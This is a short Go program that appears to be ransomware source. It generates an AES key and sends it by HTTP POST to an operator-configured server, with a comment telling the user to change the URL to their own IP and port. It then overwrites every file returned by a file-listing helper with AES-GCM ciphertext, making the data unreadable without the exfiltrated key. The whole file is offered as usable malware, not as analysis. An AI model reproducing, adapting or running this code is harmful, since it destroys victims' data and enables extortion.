package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fileutils"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
)

// Encrypt main function
func main() {
	bytes := make([]byte, 32)
	if _, err := rand.Read(bytes); err != nil {
		panic(err.Error())
	}

	key := hex.EncodeToString(bytes)
	// We have to send the key to the server
	sendKeyToServer(key)

	for _, file := range fileutils.GetAllFiles() {
		plaintext, err := ioutil.ReadFile(file)
		if err != nil {
			panic(err.Error())
		}

		block, err := aes.NewCipher(bytes)
		if err != nil {
			panic(err.Error())
		}

		aesGCM, err := cipher.NewGCM(block)
		if err != nil {
			panic(err.Error())
		}

		nonce := make([]byte, aesGCM.NonceSize())
		if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
			panic(err.Error())
		}

		ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)

		err2 := ioutil.WriteFile(file, []byte(hex.EncodeToString(ciphertext)), 0644)

		if err2 != nil {
			panic(err.Error())
		}
	}

}

func sendKeyToServer(key string) {

	// change the url to your ip address and port
	URL := "http://localhost:8080/"

	resp, err := http.PostForm(URL, url.Values{"key": {key}})

	if err != nil {
		panic(err.Error())
	}

	defer resp.Body.Close()
}
